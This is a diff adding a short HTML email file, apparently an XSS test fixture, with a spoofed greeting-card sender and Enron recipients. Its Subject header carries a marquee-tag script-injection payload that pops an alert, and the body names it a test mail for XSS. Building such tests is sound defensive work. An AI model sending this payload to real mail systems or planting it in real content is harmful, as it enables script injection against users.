@@ -1,0 +1,7 @@
+From: "AmericanGreetings.Com" <bxe@acesign.com>
+To: john.grass@enron.com, gary.bryan@enron.com
+Subject: <marquee onstart=alert(/xss/)></marquee>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
